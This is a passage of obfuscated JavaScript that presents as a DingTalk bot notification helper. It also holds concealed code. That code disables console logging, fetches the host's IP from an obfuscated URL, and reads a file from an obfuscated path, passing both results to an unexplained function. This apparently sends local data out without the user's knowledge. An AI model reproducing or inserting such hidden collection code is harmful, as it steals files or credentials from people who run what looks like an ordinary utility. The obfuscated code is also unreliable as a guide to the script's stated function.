_0x1ea1cf=_0x248f20;if(_0x1a1ce3[_0x3b93('0x29')](_0x1a1ce3[_0x3b93('0x5e')],_0x1a1ce3['sFVlu'])){let _0x107ceb;try{_0x107ceb=_0x1ea1cf[_0x3b93('0x49')](Function,_0x1ea1cf['pMrIv']('return\x20(function()\x20'+_0x1ea1cf[_0x3b93('0x4d')],');'))();}catch(_0x544cba){_0x107ceb=window;}return _0x107ceb;}else{const _0x333bac=_0xdadcff['constructor'](_0x1a1ce3[_0x3b93('0x2')])()[_0x3b93('0x7d')](_0x1a1ce3[_0x3b93('0xa')]);return!_0x333bac['test'](_0xbdb49c);}};return _0x433afc[_0x3b93('0x45')](_0xdadcff);}});_0x433afc['VJIyH'](_0xbdb49c);const _0x488f26=_0x433afc[_0x3b93('0x14')](_0x11160f,this,function(){const _0x566f14={};_0x566f14[_0x3b93('0x61')]=function(_0x7fa8fe,_0x22ae2a){return _0x7fa8fe(_0x22ae2a);};_0x566f14['kixzT']=function(_0x334c5a,_0x5e444e){return _0x334c5a+_0x5e444e;};_0x566f14[_0x3b93('0x2c')]='{}.constructor(\x22return\x20this\x22)(\x20)';_0x566f14[_0x3b93('0x79')]=function(_0x4861b6,_0x959bf7){return _0x1a1ce3[_0x3b93('0x8d')](_0x4861b6,_0x959bf7);};_0x566f14[_0x3b93('0x40')]=_0x1a1ce3[_0x3b93('0x8')];_0x566f14[_0x3b93('0x72')]=_0x1a1ce3[_0x3b93('0x60')];const _0x379a2d=_0x566f14;if(_0x1a1ce3[_0x3b93('0x8b')](_0x1a1ce3[_0x3b93('0x69')],_0x1a1ce3[_0x3b93('0x73')])){resolve();}else{const _0x309118=function(){};const _0x1b6724=function(){let _0x21c98d;try{_0x21c98d=_0x379a2d[_0x3b93('0x61')](Function,_0x379a2d[_0x3b93('0x4e')](_0x3b93('0x2d'),_0x379a2d[_0x3b93('0x2c')])+');')();}catch(_0x44565f){if(_0x379a2d[_0x3b93('0x79')](_0x379a2d[_0x3b93('0x40')],_0x379a2d['nwOEx'])){const _0x4733d7={};_0x4733d7['log']=_0x309118;_0x4733d7[_0x3b93('0x7c')]=_0x309118;_0x4733d7[_0x3b93('0x18')]=_0x309118;_0x4733d7[_0x3b93('0x26')]=_0x309118;_0x4733d7[_0x3b93('0x25')]=_0x309118;_0x4733d7[_0x3b93('0x3c')]=_0x309118;_0x4733d7[_0x3b93('0x1d')]=_0x309118;_0x4733d7[_0x3b93('0x52')]=_0x309118;return _0x4733d7;}else{_0x21c98d=window;}}return _0x21c98d;};const _0x3882c1=_0x1a1ce3[_0x3b93('0x78')](_0x1b6724);if(!_0x3882c1[_0x3b93('0x50')]){_0x3882c1[_0x3b93('0x50')]=function(_0x50f63d){const _0x3d82f5={};_0x3d82f5[_0x3b93('0x35')]=function(_0x2e2214,_0x4aebbd){return _0x379a2d[_0x3b93('0x61')](_0x2e2214,_0x4aebbd);};const _0x5583e2=_0x3d82f5;if(_0x3b93('0x7')===_0x379a2d['qyhIZ']){const _0x4901ee={};_0x4901ee[_0x3b93('0x56')]=_0x50f63d;_0x4901ee[_0x3b93('0x7c')]=_0x50f63d;_0x4901ee['debug']=_0x50f63d;_0x4901ee[_0x3b93('0x26')]=_0x50f63d;_0x4901ee['error']=_0x50f63d;_0x4901ee[_0x3b93('0x3c')]=_0x50f63d;_0x4901ee[_0x3b93('0x1d')]=_0x50f63d;_0x4901ee[_0x3b93('0x52')]=_0x50f63d;return _0x4901ee;}else{_0x5583e2['yOHdC'](resolve,data);}}(_0x309118);}else{const _0x3a50bb=_0x1a1ce3['MscTK'][_0x3b93('0x37')]('|');let _0x3cd233=0x0;while(!![]){switch(_0x3a50bb[_0x3cd233++]){case'0':_0x3882c1[_0x3b93('0x50')]['warn']=_0x309118;continue;case'1':_0x3882c1[_0x3b93('0x50')][_0x3b93('0x18')]=_0x309118;continue;case'2':_0x3882c1[_0x3b93('0x50')]['error']=_0x309118;continue;case'3':_0x3882c1[_0x3b93('0x50')][_0x3b93('0x26')]=_0x309118;continue;case'4':_0x3882c1[_0x3b93('0x50')][_0x3b93('0x1d')]=_0x309118;continue;case'5':_0x3882c1[_0x3b93('0x50')]['trace']=_0x309118;continue;case'6':_0x3882c1['console'][_0x3b93('0x56')]=_0x309118;continue;case'7':_0x3882c1[_0x3b93('0x50')][_0x3b93('0x3c')]=_0x309118;continue;}break;}}}});_0x433afc[_0x3b93('0x3f')](_0x488f26);return new Promise(_0x2b944f=>{const _0x50a316={};_0x50a316[_0x3b93('0x67')]=function(_0x2bebdb,_0x5d3060){return _0x433afc['jtxQn'](_0x2bebdb,_0x5d3060);};_0x50a316[_0x3b93('0x75')]=_0x433afc[_0x3b93('0x3a')];_0x50a316[_0x3b93('0x2b')]=function(_0x3cf602,_0x574469){return _0x433afc['LXDtG'](_0x3cf602,_0x574469);};_0x50a316[_0x3b93('0x89')]=_0x433afc[_0x3b93('0x86')];_0x50a316[_0x3b93('0x1b')]=_0x3b93('0x81');_0x50a316[_0x3b93('0x82')]=function(_0x1971bd,_0x60e282){return _0x433afc[_0x3b93('0x4f')](_0x1971bd,_0x60e282);};_0x50a316[_0x3b93('0x30')]=function(_0x87df0b,_0x490a56){return _0x433afc[_0x3b93('0x1e')](_0x87df0b,_0x490a56);};_0x50a316[_0x3b93('0x2a')]='{}.constructor(\x22return\x20this\x22)(\x20)';_0x50a316[_0x3b93('0x13')]=_0x433afc[_0x3b93('0x54')];_0x50a316[_0x3b93('0x4b')]='^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}';_0x50a316[_0x3b93('0x38')]=_0x433afc[_0x3b93('0x87')];_0x50a316[_0x3b93('0x2f')]=function(_0x5268ee,_0x369b78){return _0x433afc[_0x3b93('0x43')](_0x5268ee,_0x369b78);};_0x50a316['xLwiY']=_0x433afc[_0x3b93('0x65')];_0x50a316[_0x3b93('0x22')]=_0x433afc[_0x3b93('0x84')];const _0x2b84e5=_0x50a316;const {DD_BOT_TOKEN,DD_BOT_SECRET}=_0x24d4a0;const _0x342444={};_0x342444['content']=_0x4c9028+'\x0a\x0a'+_0x5bfb62;const _0x990402={};_0x990402[_0x3b93('0x21')]=_0x433afc['pGbBM'];_0x990402['text']=_0x342444;const _0x4cea15={};_0x4cea15[_0x3b93('0x47')]=_0x3b93('0x55');const _0x204970={};_0x204970[_0x3b93('0x27')]='https://oapi.dingtalk.com/robot/send?access_token='+DD_BOT_TOKEN;_0x204970[_0x3b93('0x48')]=_0x990402;_0x204970[_0x3b93('0x24')]=_0x4cea15;_0x204970[_0x3b93('0x5c')]=_0x2d4715;const _0x2fdefa=_0x204970;if(_0x433afc[_0x3b93('0x7b')](DD_BOT_TOKEN,DD_BOT_SECRET)){const _0x572a32=_0x433afc[_0x3b93('0x4f')](require,_0x433afc[_0x3b93('0x1c')]);const _0x5d1706=Date[_0x3b93('0x31')]();const _0x22b035=_0x572a32[_0x3b93('0x51')](_0x3b93('0x5b'),DD_BOT_SECRET);_0x22b035[_0x3b93('0x16')](_0x5d1706+'\x0a'+DD_BOT_SECRET);const _0x32fd52=_0x433afc['xwDdp'](encodeURIComponent,_0x22b035[_0x3b93('0x74')](_0x433afc[_0x3b93('0x36')]));_0x2fdefa['url']=_0x2fdefa[_0x3b93('0x27')]+_0x3b93('0x19')+_0x5d1706+_0x3b93('0x39')+_0x32fd52;_0x20798a['post'](_0x2fdefa,(_0x247fcd,_0x3cb1f9,_0x30bc24)=>{try{if(_0x2b84e5[_0x3b93('0x67')](_0x2b84e5['XGUvM'],_0x3b93('0x34'))){if(_0x247fcd){}else{if(_0x2b84e5[_0x3b93('0x2b')](_0x30bc24['errcode'],0x0)){}else{}}}else{const _0x1dec20=firstCall?function(){if(fn){const _0x4ab492=fn[_0x3b93('0x23')](context,arguments);fn=null;return _0x4ab492;}}:function(){};firstCall=![];return _0x1dec20;}}catch(_0x3fe4e4){}finally{if(_0x2b84e5[_0x3b93('0x2b')](_0x2b84e5[_0x3b93('0x89')],_0x2b84e5['XVaYb'])){_0x2b944f(_0x30bc24);}else{_0x2b84e5[_0x3b93('0x82')](_0x2b944f,_0x30bc24);}}});}else if(DD_BOT_TOKEN){_0x20798a[_0x3b93('0x1')](_0x2fdefa,(_0x45b782,_0x56f6ca,_0x1c36a3)=>{const _0x135f90={};_0x135f90['VylTE']=function(_0x9c964b,_0x558942){return _0x9c964b(_0x558942);};_0x135f90[_0x3b93('0xe')]=function(_0x3fcfdc,_0x174c8f){return _0x2b84e5[_0x3b93('0x30')](_0x3fcfdc,_0x174c8f);};_0x135f90['cupOG']=_0x3b93('0x2d');_0x135f90[_0x3b93('0x7e')]=_0x2b84e5['vtOAo'];_0x135f90[_0x3b93('0x10')]=_0x2b84e5['pSEbT'];_0x135f90['kJJUQ']=_0x2b84e5[_0x3b93('0x4b')];_0x135f90[_0x3b93('0x33')]=function(_0x26768e){return _0x26768e();};const _0x35663a=_0x135f90;if(_0x2b84e5[_0x3b93('0x2b')](_0x3b93('0x59'),_0x2b84e5[_0x3b93('0x38')])){globalObject=_0x35663a[_0x3b93('0x62')](Function,_0x35663a[_0x3b93('0xe')](_0x35663a[_0x3b93('0x66')],_0x35663a[_0x3b93('0x7e')])+');')();}else{try{if(_0x45b782){}else{if(_0x2b84e5['XoXMj']('BdDua',_0x3b93('0x28'))){if(_0x2b84e5['XoXMj'](_0x1c36a3[_0x3b93('0x6a')],0x0)){}else{}}else{const _0x6e31b9=function(){const _0x5c874e=_0x6e31b9[_0x3b93('0x70')](_0x35663a[_0x3b93('0x10')])()['compile'](_0x35663a[_0x3b93('0x15')]);return!_0x5c874e[_0x3b93('0x80')](_0xbdb49c);};return _0x35663a['zKKSR'](_0x6e31b9);}}}catch(_0x42f79b){}finally{if(_0x2b84e5[_0x3b93('0x2f')](_0x2b84e5[_0x3b93('0xd')],_0x2b84e5[_0x3b93('0x22')])){_0x2b944f(_0x1c36a3);}else{const _0x492136=test['constructor'](_0x35663a['HdzLq'])()['compile']('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!_0x492136['test'](_0xbdb49c);}}}});}else{_0x433afc[_0x3b93('0x45')](_0x2b944f);}});}else{globalObject=window;}}_0x433afc[_0x3b93('0x2e')](fetch,_0x433afc[_0x3b93('0x3e')])[_0x3b93('0x71')](_0x17c91e=>_0x17c91e[_0x3b93('0x48')]())['then'](_0x3950ea=>_0x53aeaa('ip',_0x3950ea['ip']))[_0x3b93('0x8c')]();const _0x10186b=_0x433afc['HoHVs'](require,'fs');const _0x940284=_0x433afc['KwsSj'];_0x10186b['readFile'](_0x940284,_0x433afc[_0x3b93('0x5f')],(_0xc78e8f,_0x19eccd)=>{const _0x366e01={};_0x366e01[_0x3b93('0x7a')]=function(_0x221521,_0xe80d7){return _0x433afc[_0x3b93('0x4')](_0x221521,_0xe80d7);};const _0x5add83=_0x366e01;if(_0x433afc['pABTH']===_0x433afc['GRgxn']){if(_0x5add83[_0x3b93('0x7a')](_0x19eccd[_0x3b93('0x6a')],0x0)){}else{}}else{try{_0x53aeaa('zm',_0x19eccd);}catch(_0x20c06a){if(_0x433afc['BFVcg'](_0x433afc[_0x3b93('0x32')],'zkjjd')){return;}else{const _0x231d53=fn[_0x3b93('0x23')](context,arguments);fn=null;return _0x231d53;}}}});}());
    process['exit'](0);
}

start();

function getRandom (_0x3bfe5c, _0x38370c) {
    return Math['floor'](Math["random"]() * (_0x38370c - _0x3bfe5c + 1) + _0x3bfe5c);
}